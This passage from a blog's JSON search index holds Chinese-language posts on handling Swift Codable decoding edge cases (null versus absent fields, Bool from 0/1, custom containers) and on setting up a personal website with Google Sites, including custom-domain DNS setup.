2025-01-19 | 15,247 Views on Medium. " }, { "title": "現實使用 Codable 上遇到的 Decode 問題場景總匯(下)", "url": "/posts/cb00b1977537/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, codable, json, core-data", "date": "2020-06-26 01:56:31 +0800", "snippet": "現實使用 Codable 上遇到的 Decode 問題場景總匯(下)合理的處理 Response Null 欄位資料、不一定都要重寫 init decoderPhoto by Zan前言既上篇「 現實使用 Codable 上遇到的 Decode 問題場景總匯 」後，開發進度繼續邁進又遇到了新的場景新的問題，故出了此下篇，繼續把遇到的情景、研究心路都記錄下來，方便日後回頭查閱。前篇主要解決了 ...", "content": "現實使用 Codable 上遇到的 Decode 問題場景總匯(下)合理的處理 Response Null 欄位資料、不一定都要重寫 init decoderPhoto by Zan前言既上篇「 現實使用 Codable 上遇到的 Decode 問題場景總匯 」後，開發進度繼續邁進又遇到了新的場景新的問題，故出了此下篇，繼續把遇到的情景、研究心路都記錄下來，方便日後回頭查閱。前篇主要解決了 JSON String -&gt; Entity Object 的 Decodable Mapping，有了 Entity Object 後我們可以轉換成 Model Object 在程式內傳遞使用、View Model Object 處理資料顯示邏輯…等等； 另一方面我們需要將 Entity 轉換成 NSManagedObject 存入本地 Core Data 中 。主要問題假設我們的歌曲 Entity 結構如下：struct Song: Decodable { var id: Int var name: String? var file: String? var converImage: String? var likeCount: Int? var like: Bool? var length: Int?}因 API EndPoint 並不一定會回傳完整資料欄位(只有 id 是一定會給)，所以除 id 之外的欄位都是 Optional；例如：取得歌曲資訊的時候會回傳完整結構，但若是對歌曲收藏喜歡時僅會回傳 id 、 likeCount 、 like 三個有關聯更動的欄位資料。我們希望 API Response 有什麼欄位資料都能一併存入 Core Data 裡，如果資料已存在就更新變動的欄位資料（incremental update）。 但此時問題就出現了：Codable Decode 換成 Entity Object 後我們無法區別 「資料欄位是想要設成 nil」 還是 「Response 沒給」A Response:{ \"id\": 1, \"file\": null}對於 A Response、B Response 的 file 來說都是 null 、但意義不一一樣 ；A 是想把 file 欄位設為 null (清空原本資料)、 B 是想 update 其他資料，單純沒給 file 欄位而已。 Swift 社群有開發者提出 增加類似 date Strategy 的 null Strategy 在 JSONDecoder 中 ，讓我們能區分以上狀況，但目前沒有計畫要加入。解決方案如前所述，我們的架構是JSON String -&gt; Entity Object -&gt; NSManagedObject，所以當拿到 Entity Object 時已經是 Decode 後的結果了，沒有 raw data 可以操作；這邊當然可以拿原始 JSON String 比對操作，但與其這樣不如不要用 Codable。首先參考 上一篇 使用 Associated Value Enum 當容器裝值。enum OptionalValue&lt;T: Decodable&gt;: Decodable { case null case value(T) init(from decoder: Decoder) throws { let container = try decoder.singleValueContainer() if let value = try? container.decode(T.self) { self = .value(value) } else { self = .null } }}使用泛型，T 為真實資料欄位型別；.value(T) 能放 Decode 出來的值、.null 則代表值是 null。struct Song: Decodable { enum CodingKeys: String, CodingKey { case id case file } var id: Int var file: OptionalValue&lt;String&gt;? init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) if container.contains(.file) { self.file = try container.decode(OptionalValue&lt;String&gt;.self, forKey: .file) } else { self.file = nil } }}var jsonData = \"\"\"{ \"id\":1}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)jsonData = \"\"\"{ \"id\":1, \"file\":null}\"\"\".data(using: .utf8)!result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)jsonData = \"\"\"{ \"id\":1, \"file\":\\\"https://test.com/m.mp3\\\"}\"\"\".data(using: .utf8)!result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result) 範例先簡化成只有 id 、 file 兩個資料欄位。Song Entity 自行複寫實踐 Decode 方式，使用 contains(.KEY) 方法判斷 Response 有無給該欄位(無論值是什麼)，如果有就 Decode 成 OptionalVale ；OptionalValue Enum 中會再對真正我們要的值做 Decode ，如果有值 Decode 成功則會放在 .value(T) 、如果給的值是 null (或 decode 失敗)則放在 .null 。 Response 有給欄位&amp;值時：OptionalValue.value(VALUE) Response 有給欄位&amp;值是 null 時：OptionalValue.null Response 沒給欄位時：nil 這樣就能區分出是有給欄位還是沒給欄位，後續要寫入 Core Data 時就能判斷是要更新欄位成 null、還是沒有要更新此欄位。其他研究 — Double Optional ❌Optional!Optional! 在 Swift 上就很適合處理這個場景。struct Song: Decodable { var id: Int var name: String?? var file: String?? var converImage: String?? var likeCount: Int?? var like: Bool?? var length: Int??} Response 有給欄位&amp;值時：Optional(VALUE) Response 有給欄位&amp;值是 null 時：Optional(nil) Response 沒給欄位時：nil但是….Codable JSONDecoder Decode 對 Double Optional 跟 Optional 都是 decodeIfPresent 在處理，都視為 Optional ，不會特別處理 Double Optional；所以結果跟原本一樣。其他研究 — Property Wrapper ❌本來預想可以用 Property Wrapper 做優雅的封裝，例如：@OptionalValue var file: String?但還沒開始研究細節就發現有 Property Wrapper 標記的 Codable Property 欄位，API Response 就必須要有該欄位，否則會出現 keyNotFound error，即使該欄位是 Optional。?????官方論壇也有針對此問題的 討論串 …估計之後會修正。 所以選用 BetterCodable 、 CodableWrappers 這類套件的時候要考慮到目前 Property Wrapper 的這個問題。其他問題場景1.API Response 使用 0/1 代表 Bool，該如何 Decode?import Foundationstruct Song: Decodable { enum CodingKeys: String, CodingKey { case id case name case like } var id: Int var name: String? var like: Bool? init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) self.name = try container.decodeIfPresent(String.self, forKey: .name) if let intValue = try container.decodeIfPresent(Int.self, forKey: .like) { self.like = (intValue == 1) ? true : false } else if let boolValue = try container.decodeIfPresent(Bool.self, forKey: .like) { self.like = boolValue } }}var jsonData = \"\"\"{ \"id\": 1, \"name\": \"告五人\", \"like\": 0}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)延伸前篇，我們可以自己在 init Decode 中，Decode 成 int/Bool 然後自己賦值、這樣就能擴充原本的欄位能接受 0/1/true/false了。2.不想要每每都要重寫 init decoder在不想要自幹 Decoder 的情況下，複寫原本的 JSON Decoder 擴充更多功能。我們可以自行 extenstion KeyedDecodingContainer 對 public 方法自行定義，swift 會優先執行 module 下我們重定義的方法，複寫掉原本 Foundation 的實作。 影響的就是整個 module。 且不是真的 override，無法 call super.decode，也要小心不要自己 call 自己(EX: decode(Bool.Type,for:key) in decode(Bool.Type,for:key) )decode 有兩個方法： decode(Type, forKey:) 處理非 Optional 資料欄位 decodeIfPresent(Type, forKey:) 處理 Optional 資料欄位範例1. 前述的主要問題就我們可以直接 extenstion：extension KeyedDecodingContainer { public func decodeIfPresent&lt;T&gt;(_ type: T.Type, forKey key: Self.Key) throws -&gt; T? where T : Decodable { //better: switch type { case is OptionalValue&lt;String&gt;.Type, is OptionalValue&lt;Int&gt;.Type: return try? decode(type, forKey: key) default: return nil } // or just return try? decode(type, forKey: key) }}struct Song: Decodable { var id: Int var file: OptionalValue&lt;String&gt;?}因主要問題是 Optional 資料欄位、Decodable 類型，所以我們複寫的是 decodeIfPresent&lt;T: Decodable&gt; 這個方法。這邊推測原本 decodeIfPresent 的實作是，如果資料是 null 或 Response 未給 會直接 return nil，並不會真的跑 decode。所以原理也很簡單，只要 Decodable Type 是 OptionValue 則不論如何都 decode 看看，我們才能拿到不同狀態結果；但其實不判斷 Decodable Type 也行，那就是所有 Optional 欄位都會試著 Decode。範例2. 問題場景1 也能用此方法擴充：extension KeyedDecodingContainer { public func decodeIfPresent(_ type: Bool.Type, forKey key: KeyedDecodingContainer&lt;K&gt;.Key) throws -&gt; Bool? { if let intValue = try? decodeIfPresent(Int.self, forKey: key) { return (intValue == 1) ? (true) : (false) } else if let boolValue = try? decodeIfPresent(Bool.self, forKey: key) { return boolValue } return nil }}struct Song: Decodable { enum CodingKeys: String, CodingKey { case id case name case like } var id: Int var name: String? var like: Bool?}var jsonData = \"\"\"{ \"id\": 1, \"name\": \"告五人\", \"like\": 1}\"\"\".data(using: .utf8)!var result = try! JSONDecoder().decode(Song.self, from: jsonData)print(result)結語Codable 在使用上的各種奇技淫巧都用的差不多了，有些其實很繞，因為 Codable 的約束性實在太強、犧牲許多現實開發上需要的彈性；做到最後甚至開始思考為何當初要選擇 Codable，優點越做越少….參考資料 或许你并不需要重写 init(from:)方法回看 現實使用 Codable 上遇到的 Decode 問題場景總匯(上)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,720 Total Views Last Statistics Date: 2025-01-19 | 1,650 Views on Medium. " }, { "title": "使用 Google Site 建立個人網站還跟得上時代嗎？", "url": "/posts/724a7fb9a364/", "categories": "ZRealm Life.", "tags": "google, google-sites, web-development, 生活, domain-names", "date": "2020-06-17 23:53:54 +0800", "snippet": "使用 Google Site 建立個人網站還跟得上時代嗎？新 Google Site 個人網站建立經驗及設定教學Update 2022–07–17目前已透過我自己撰寫的 ZMediumToMarkdown 工具將 Medium 文章打包下載並轉換為 Markdown 格式，搬遷到 Jekyll。zhgchg.li 手把手無痛轉移教學可點此 🚀🚀🚀🚀🚀===起源去年換工作時，很「虛花」的註冊...", "content": "使用 Google Site 建立個人網站還跟得上時代嗎？新 Google Site 個人網站建立經驗及設定教學Update 2022–07–17目前已透過我自己撰寫的 ZMediumToMarkdown 工具將 Medium 文章打包下載並轉換為 Markdown 格式，搬遷到 Jekyll。zhgchg.li 手把手無痛轉移教學可點此 🚀🚀🚀🚀🚀===起源去年換工作時，很「虛花」的註冊了個 域名 來做個人履歷的導向連結；時隔半年想說讓域名更有用一些能放更多資訊、另一方面也是一直在尋覓第二網站備份 Medium 上已發表的文章，以防有個萬一。期望功能 可有自訂頁面 跟 Medium 一樣的流暢寫作介面 互動功能（按讚/留言/追蹤） SEO結構好 輕量載入快 能綁定自己的網域 侵入性低 (廣告侵入性、網站標注) 建置容易架站選擇 自架 WordPress 很久以前租過主機、網域，使用 WordPress 架過個人網站；從架設到調整到自己喜愛的版面樣式、安裝 Plugin/甚至自己開發缺少的 Plugin 完以後，我已沒有心力寫作，而且覺得很笨重、載入速度/SEO 也不如 Medium，要再繼續花時間調校，那就更沒有寫作的心力了。 Matters/簡書…之類 跟 Medium 平台差不多，因我不考慮盈利方面，不適合。 wix/weebly 太偏商業網站，且免費版侵入性太強 Google Site（本篇） Github Pages + Jekyll 還在找 &gt;&gt;&gt; 歡迎提供建議關於 Google Site大約 2010 年時有用過舊版的 Google Site，當初拿來做個人網站的 -&gt; 檔案下載中心頁面；印象已有點模糊，只記得那時候的版面很笨重、介面用起來也很不順；事隔 10 年，我本來以為這個服務已經收收掉了，無意間喵到有網域投資者，拿來做域名停泊頁放出售聯絡資訊：第一眼看到的時候覺得「哇！視覺不錯，居然為了賣網域弄了個頁面」；仔細一下左下角浮標，才發現「哇！居然是 Google Site 建的」，跟我 10 年前用的介面天差地遠，查了一下才知道 Google Site 沒有停止服務，反而在 2016 年推出全新版本，雖然也距今快五年，但至少介面跟得上時代了！成品展示什麼都先別說，先來看我做的成品，如果你也「心有靈犀」可以考慮使用看看！首頁個人簡歷頁城市一隅(瀑布流相片呈現)文章目錄(連回 Medium)與我聯絡 (內嵌 Google 表單)何不試試？節省閱讀時間，我 先講結論；我依然在尋找更合適的服務選項 ，雖然他有在持續維護更新功能，但 Google Site 有幾個對我很重要點需求無法滿足，以下列舉我在使用上遇到的致命缺點。致命缺點 程式碼高亮功能缺陷 功能只有 Code Block 底色反灰顯示 不會變色，若要嵌入 Gist 只能使用 Embed JavaScript (iframe)，但 Google Site 沒有特別處理，高度無法隨頁面縮放進行改變，要馬空白太多、要馬手機小螢幕上會出現裡外兩個 ScrollBar，非常醜也不好閱讀。 SEO 結構基本為零 「驚不驚喜、益不意外?」Google 自己的服務結果 SEO 結構跟💩ㄧ樣，不給客製任何 head meta (description/tag/og:) 先別管 SEO 收錄排名，光把自己的網站貼到 Line/Facebook 等社群，沒有任何預覽資訊，只有醜醜的網址跟網站名稱而已。優點1.侵入性低，僅左下會有懸浮驚嘆號點了才會顯示「Google 協作平台 檢舉濫用」2.介面易用，右邊元件拉一拉就能快速建立頁面類似 wix/weebly. .or cakeresume? 版面配置、元件拉一拉填一填就完成了！3. 支援 RWD、內建搜尋、導航列4.支援 Landing Page5.流量無特別限制、容量按照創建者的 Google Drive 容量上限6. 🌟 可綁定自己的網域7. 🌟 可直接串GA分析訪客8. 官方社群 會收集意見、持續維護更新9. 支援公告提示10. 🌟 無痛完美嵌入 Youtube、Google 表單、Google 簡報、Google 文件、Google 行事曆、 Google 地圖，且支援 RWD 電腦/手機瀏覽11. 🌟 頁面內容支援 JavaScript/Html/CSS 內嵌12. 網址乾淨簡潔(http://example.com/頁面名/子頁面名)、頁面路徑名可自訂13. 🌟 頁面排版有參考線/自動對齊，非常貼心拖曳元件位置會出現參考對齊線適用網站我覺得 Google Site 只適合非常輕量的網頁服務，例如學校社團、小活動的網頁、個人簡歷。一些設定教學列舉一些自己在使用上遇到＆解決的問題；其他都是所見即所得的操作，沒有什麼好紀錄的。如何綁定個人網域？1. 前往 http://google.com/webmasters/verification 2. 點擊「 新增資源 」輸入「 您的網域」 點擊 「繼續」3. 選擇您的「 網域服務供應商 」複製 「 DNS 設定驗證字串 」4. 前往網域服務供應商的網站 (這邊以 Namecheap.com 為例，大同小異)在 DNS 設定區塊新增一筆紀錄，類型選「 TXT Record 」、主機輸入「 @ 」、值輸入 剛複製的DNS 設定驗證字串 ，按新增送出。再新增一筆紀錄，類型選「 CNAME Record 」、主機輸入「 www (或你想用的子網域) 」、值輸入「 ghs.googlehosted.com. 」按新增送出。 另外也可多轉址 http://zhgchg.li -&gt; http://www.zhgchg.li 這邊設定完需要稍等一下…等待 DNS 紀錄生效。。。5. 回到 Google Master 按驗證 若出現 「驗證資源失敗」 別急！請再稍等一下，如果超過 1 小時都還是無法，再回頭檢查一下設定是否有誤。成功驗證網域所有權6. 回到您的 Google Site 設定頁面點擊右上角「 齒輪(設定) 」選擇「 自訂網址 」輸入想要指派的網域名稱，或你想用的子網域，按「 指派 。指派成功後關閉設定視窗，點擊右上角的「 發布 」發布。 這邊一樣需要稍等一下…等待 DNS 紀錄生效。。。7. 新開一個瀏覽器輸入網址試試看能不能正常瀏覽 若出現 「網頁無法開啟」 別急！請再稍等一下，如果超過 1 小時都還是無法，再回頭檢查一下設定是否有誤。完成!子頁面、頁面路徑設定再導航列目錄子頁面會自動聚集顯示如何設定？右方切換到「頁面」頁籤。可新增頁面用拖曳的方式拖到現有頁面下就會變成子頁面、或點擊「…」操作。選擇屬性可自訂頁面路徑。輸入路徑名稱（EX: dev -&gt; http://www.zhgchg.li/dev）頁首頁尾設定1.頁首設定滑鼠移到導航列，選擇「 新增頁首 」新增頁首後滑鼠移到左下角就能變更圖片、輸入標題文字、變更標頭類型2.頁尾設定滑鼠移到頁面底部，選擇「 編輯頁尾 」即可輸入頁尾資訊。 注意！頁尾資訊是全站共用的，所有頁面都會套用同樣的內容！ 也可點左下角的「眼睛」，控制本頁是否要顯示頁尾資訊設定網站 favicon 、標頭名稱、圖示favicon網站標題、Logo如何設定？點擊右上角「 齒輪(設定) 」選擇「 品牌圖片 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！隱藏/顯示頁面最後更新資訊、頁面錨點連結提示最後更新資訊頁面錨點連結提示如何設定？點擊右上角「 齒輪(設定) 」選擇「 檢視者工具 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！串接 GA 分析流量1.前往 https://analytics.google.com/analytics/web/?authuser=0#/provision/SignUp 建立新 GA 帳戶2.建立完成後複製 GA 追蹤 ID3.回到您的 Google Site 設定頁面點擊右上角「 齒輪(設定) 」選擇「 分析 」輸入「 GA 追蹤 ID 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！設定全站/首頁橫幅公告橫幅公告如何設定？點擊右上角「 齒輪(設定) 」選擇「 公告橫幅 」即可設定，設定完別忘了回到頁面按「 發布 」才會生效喔！可指定橫幅訊息內容、顏色、按鈕文字、點擊前往連結、是否在新分頁開啟、設定全站 or 僅首頁顯示。發布設定右上角「發布 ▾」可檢查變更內容並發布。可設定是否讓搜尋引擎收錄及取消每次發布都要先跳檢查內容頁。嵌入 Javascript/HTML/CSS、大量圖片Gist 為例 但如上述致命缺點所說，嵌入 iframe 無法依照網頁大小響應高度。如何插入？選「內嵌」選擇嵌入程式碼可輸入 JavaScript/HTML/CSS，可拿來做自訂樣式的 Button UI。 另外選「圖片」插入可插入多張圖片，會以瀑布流呈現(如上述我的 城市一隅 頁面)。內嵌的 Google 表單無法在頁面直接填寫？這個原因是因為表單題目中有「 檔案上傳 」項目， 因瀏覽器安全性問題無法使用 iframe 嵌入在其他頁面中 ；所以會變成只顯示問券資訊然後要點擊填寫按鈕新開視窗前往填寫內容。解決辦法只有拿掉檔案上傳的問題，就能直接在頁面內進行填寫了。按鈕元件網址內容不能輸入錨點EX: #lifesection，我想拿來放頁面上方，做目錄索引瀏覽或頁底做 GoTop 按鈕查了下官方社群，目前不行，按鈕的連結就只能 1.輸入外部連結在新視窗中開啟或 2. 指定內部頁面，所以我後來用子頁面的方式來拆分目錄了。延伸閱讀 [生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 19,072 Total Views Last Statistics Date: 2025-01-19 | 18,892 Views on Medium. " }, { "title": "現實使用 Codable 上遇到的 Decode 問題場景總匯", "url": "/posts/1aa2f8445642/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, codable, json, decode", "date": "2020-06-14 00:33:58 +0800", "snippet": "現實使用 Codable 上遇到的 Decode 問題場景總匯(上)從基礎到進階，深入使用 Decodable 滿足所有可能會遇到的問題場景Photo by Gustas Brazaitis前言因應後端 API 升級需要調整 API 處理架構，近期趁這個機會一併將原本使用 Objective-C 撰寫的網路處理架構更新成 Swift；因語言不同，也不在適合使用原本的 Restkit 幫我們處...", "content": "現實使用 Codable 上遇到的 Decode 問題場景總匯(上)從基礎到進階，深入使用 Decodable 滿足所有可能會遇到的問題場景Photo by Gustas Brazaitis前言因應後端 API 升級需要調整 API 處理架構，近期趁這個機會一併將原本使用 Objective-C 撰寫的網路處理架構更新成 Swift；因語言不同，也不在適合使用原本的 Restkit 幫我們處理網路層應用，但不得不說 Restkit 的功能包山包海非常強大，在專案中也用得活靈活現，基本沒有太大的問題；但相對的非常笨重、幾乎已不再維護、純 Objective-C；未來勢必也要更換的。Restkit 幾乎幫我們處理完所有網路請求相關會需要到的功能，從基本的網路處理、API 呼叫、網路處理，到 Response 處理 JSON String to Object 甚至是 Object 存入 Core Data 它都能一起處理實打實的一個 Framework 打十個。隨著時代的演進，目前的 Framework 已不在主打一個包全部，更多的是靈活、輕巧、組合，增加更多彈性創造更多變化；因此再替換成 Swift 語言的同時，我們選擇使用 Moya 作為網路處理部分的套件，其他我們需要的功能再選擇其他方式進行組合。正題關於 JSON String to Object Mapping 部分，我們使用 Swift 自帶的 Codable (Decodable) 協議 &amp; JSONDecoder 進行處理；並拆分 Entity/Model 加強權責區分、操作及閱讀性、另外 Code Base 混 Objective-C 和 Swift 也要考量進去。 ＊ Encodable 的部份省略、範例均只展示實作 Decodable，大同小異，可以 Decode 基本也能 Encode。開始假設我們初始的 API Response JSON String 如下:{ \"id\": 123456, \"comment\": \"是告五人，不是五告人!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" }}由上範例我們可以拆成：User/Song/Comment 三個 Entity &amp; Model，讓我們組合能複用，為方便展示先將 Entity/Model 寫在同個檔案。User:// Entity:struct UserEntity: Decodable { var id: Int var name: String var email: String}//Model:class UserModel: NSObject { init(_ entity: UserEntity) { self.id = entity.id self.name = entity.name self.email = entity.email } var id: Int var name: String var email: String}Song:// Entity:struct SongEntity: Decodable { var id: Int var name: String}//Model:class SongModel: NSObject { init(_ entity: SongEntity) { self.id = entity.id self.name = entity.name } var id: Int var name: String}Comment:// Entity:struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } var id: Int var comment: String var targetObject: SongEntity var commenter: UserEntity}//Model:class CommentModel: NSObject { init(_ entity: CommentEntity) { self.id = entity.id self.comment = entity.comment self.targetObject = SongModel(entity.targetObject) self.commenter = UserModel(entity.commenter) } var id: Int var comment: String var targetObject: SongModel var commenter: UserModel}JSONDecoder:let jsonString = \"{ \\\"id\\\": 123456, \\\"comment\\\": \\\"是告五人，不是五告人!\\\", \\\"target_object\\\": { \\\"type\\\": \\\"song\\\", \\\"id\\\": 99, \\\"name\\\": \\\"披星戴月的想你\\\" }, \\\"commenter\\\": { \\\"type\\\": \\\"user\\\", \\\"id\\\": 1, \\\"name\\\": \\\"zhgchgli\\\", \\\"email\\\": \\\"zhgchgli@gmail.com\\\" } }\"let jsonDecoder = JSONDecoder()do { let result = try jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!)} catch { print(error)}CodingKeys Enum?當我們的 JSON String Key Name 與 Entity Object Property Name 不相匹配時可以在內部加一個 CodingKeys 枚舉進行對應，畢竟後端資料源的 Naming Convention 不是我們可以控制的。case PropertyKeyName = \"後端欄位名稱\"case PropertyKeyName //不指定則預設使用 PropertyKeyName 為後端欄位名稱一旦加入 CodingKeys 枚舉，則必須列舉出所有非 Optional 的欄位，不能只列舉想要客製的 Key。另外一種方式是設定 JSONDecoder 的 keyDecodingStrategy，若 Response 資料欄位與 Property Name 僅為 snake_case &lt;-&gt; camelCase 區別，可直接設定 .keyDecodingStrategy = .convertFromSnakeCase 就能自動匹配 Mapping。let jsonDecoder = JSONDecoder()jsonDecoder.keyDecodingStrategy = .convertFromSnakeCasetry jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!)回傳資料是陣列時：struct SongListEntity: Decodable { var songs:[SongEntity]}為 String 加上約束：struct SongEntity: Decodable { var id: Int var name: String var type: SongType enum SongType { case rock case pop case country }}適用於有限範圍的字串類型，寫成 Enum 方便我們傳遞、使用；若出現為列舉的值會 Decode 失敗！善用泛型包裹固定結構：假設多筆回傳的 JSON String 固定格式為：{ \"count\": 10, \"offset\": 0, \"limit\": 0, \"results\": [ { \"type\": \"song\", \"id\": 1, \"name\": \"1\" } ]}即可用泛型方式包裹起來：struct PageEntity&lt;E: Decodable&gt;: Decodable { var count: Int var offset: Int var limit: Int var results: [E]}使用： PageEntity&lt;Song&gt;.selfDate/Timestamp 自動 Decode：設定 JSONDecoder 的 dateDecodingStrategy .secondsSince1970/.millisecondsSince1970 : unix timestamp .deferredToDate : 蘋果的 timestamp，罕用，不同於 unix timestamp，這是從 2001/01/01 起算 .iso8601 : ISO 8601 日期格式 .formatted(DateFormatter) : 依照傳入的 DateFormatter Decode Date .custom : 自訂 Date Decode 邏輯.cutstom 範例：假設 API 會回傳 YYYY/MM/DD 和 ISO 8601 兩種格式，兩中都要能 Decode：var dateFormatter = DateFormatter()var iso8601DateFormatter = ISO8601DateFormatter()let decoder: JSONDecoder = JSONDecoder()decoder.dateDecodingStrategy = .custom({ (decoder) -&gt; Date in let container = try decoder.singleValueContainer() let dateString = try container.decode(String.self) //ISO8601: if let date = iso8601DateFormatter.date(from: dateString) { return date } //YYYY-MM-DD: dateFormatter.dateFormat = \"yyyy-MM-dd\" if let date = dateFormatter.date(from: dateString) { return date } throw DecodingError.dataCorruptedError(in: container, debugDescription: \"Cannot decode date string \\(dateString)\")})let result = try jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!) ＊DateFormatter 在 init 時非常消耗性能，盡可能重複使用。基本 Decode 常識： Decodable Protocol 內的的欄位類型(struct/class/enum)，都須實作 Decodable Protocol；亦或是在 init decoder 時賦予值 欄位類型不相符時會 Decode 失敗 Decodable Object 中欄位設為 Optional 的話則為可有可無，有給就 Decode Optional 欄位可接受: JSON String 無欄位、有給但給 nil 空白、0 不等於 nil，nil 是 nil；弱型別的後端 API 需注意！ 預設 Decodable Object 中有列舉且非 Optional 的欄位，若 JSON String 沒給會 Decode 失敗（後續會說明如何處理） 預設 遇到 Decode 失敗會直接中斷跳出，無法單純跳過有誤的資料（後續會說明如何處理）左：”” / 右：nil進階使用到此為止基本的使用已經完成了，但現實世界不會那麼簡單；以下列舉幾個進階會遇到的場景並提出適用 Codable 的解決方案，從這邊開始我們就無法靠原始的 Decode 幫我們補 Mapping 了，要自行實作 init(from decoder: Decoder) 客製 Decode 操作。 ＊這邊暫時先只展示 Entity 的部分，Model 還用不到。init(from decoder: Decoder)init decoder，必須賦予所有非 Optional 的欄位初始值（就是 init 啦！）。自訂 Decode 操作時，我們需要從 decoder 中取得 container 出來操作取值， container 有三種取得內容的類型。第一種 container(keyedBy: CodingKeys.self) 依照 CodingKeys 操作：struct SongEntity: Decodable { var id: Int var name: String enum CodingKeys: String, CodingKey { case id case name } init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) //參數 1 接受支援：實作 Decodable 的類別 //參數 2 CodingKeys self.name = try container.decode(String.self, forKey: .name) }}第二種 singleValueContainer 將整包取出操作（單值）：enum HandsomeLevel: Decodable { case handsome(String) case normal(String) init(from decoder: Decoder) throws { let container = try decoder.singleValueContainer() let name = try container.decode(String.self) if name == \"zhgchgli\" { self = .handsome(name) } else { self = .normal(name) } }}struct UserEntity: Decodable { var id: Int var name: HandsomeLevel var email: String enum CodingKeys: String, CodingKey { case id case name case email }}適用於 Associated Value Enum 欄位類型，例如 name 還自帶帥氣程度！第三種 unkeyedContainer 將整包視為一包陣列：struct ListEntity: Decodable { var items:[Decodable] init(from decoder: Decoder) throws { var unkeyedContainer = try decoder.unkeyedContainer() self.items = [] while !unkeyedContainer.isAtEnd { //unkeyedContainer 內部指針會自動在 decode 操作後指向下一個對象 //直到指向結尾即代表遍歷結束 if let id = try? unkeyedContainer.decode(Int.self) { items.append(id) } else if let name = try? unkeyedContainer.decode(String.self) { items.append(name) } } }}let jsonString = \"[\\\"test\\\",1234,5566]\"let jsonDecoder = JSONDecoder()let result = try jsonDecoder.decode(ListEntity.self, from: jsonString.data(using: .utf8)!)print(result)適用不固定類型的陣列欄位。Container 之下我們還能使用 nestedContainer / nestedUnkeyedContainer 對特定欄位操作： ＊將資料欄位扁平化（類似 flatMap）struct ListEntity: Decodable { enum CodingKeys: String, CodingKey { case items case date case name case target } enum PredictKey: String, CodingKey { case type } var date: Date var name: String var items: [Decodable] var target: Decodable init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.date = try container.decode(Date.self, forKey: .date) self.name = try container.decode(String.self, forKey: .name) let nestedContainer = try container.nestedContainer(keyedBy: PredictKey.self, forKey: .target) let type = try nestedContainer.decode(String.self, forKey: .type) if type == \"song\" { self.target = try container.decode(SongEntity.self, forKey: .target) } else { self.target = try container.decode(UserEntity.self, forKey: .target) } var unkeyedContainer = try container.nestedUnkeyedContainer(forKey: .items) self.items = [] while !unkeyedContainer.isAtEnd { if let song = try? unkeyedContainer.decode(SongEntity.self) { items.append(song) } else if let user = try? unkeyedContainer.decode(UserEntity.self) { items.append(user) } } }}存取、Decode 不同階層的物件，範例展示 target/items 使用 nestedContainer flat 出 type 再依照 type 去做對應的 decode。Decode &amp; DecodeIfPresent DecodeIfPresent： Response 有給資料欄位時才會進行 Decode（Codable Property 設 Optional 時） Decode：進行 Decode 操作，若 Response 無給資料欄位會拋出 Error ＊以上只是簡單介紹一下 init decoder、container 有哪些方法、功能，看不懂也沒關係，我們直接進入現實場景；在範例中感受組合起來的操作方式。現實場景回到原本的範例 JSON String。場景1. 假設今天對誰留言可能是對歌曲或對人留言， targetObject 欄位可能的對象是 User 或 Song ? 那該如何處理?{ \"results\": [ { \"id\": 123456, \"comment\": \"是告五人，不是五告人!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"披星戴月的想你\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" } }, { \"id\": 55, \"comment\": \"66666!\", \"target_object\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\" }, \"commenter\": { \"type\": \"user\", \"id\": 2, \"name\": \"aaaa\", \"email\": \"aaaa@gmail.com\" } } ]}方式 a.使用 Enum 做為容器 Decode。struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } var id: Int var comment: String var targetObject: TargetObject var commenter: UserEntity enum TargetObject: Decodable { case song(SongEntity) case user(UserEntity) enum PredictKey: String, CodingKey { case type } enum TargetObjectType: String, Decodable { case song case user } init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: PredictKey.self) let singleValueContainer = try decoder.singleValueContainer() let targetObjectType = try container.decode(TargetObjectType.self, forKey: .type) switch targetObjectType { case .song: let song = try singleValueContainer.decode(SongEntity.self) self = .song(song) case .user: let user = try singleValueContainer.decode(UserEntity.self) self = .user(user) } } }}我們將 targetObject 的屬性換成 Associated Value Enum，在 Decode 時才決定 Enum 內要放什麼內容。核心實踐是建立一個符合 Decodable 的 Enum 做為容器，decode 時先取關鍵欄位出來判斷(範例 JSON String 中的 type 欄位)，若為 Song 則使用 singleValueContainer 將整包解成 SongEntity ，若為 User 亦然。要使用時再從 Enum 中取出：//if case letif case let CommentEntity.TargetObject.user(user) = result.targetObject { print(user)} else if case let CommentEntity.TargetObject.song(song) = result.targetObject { 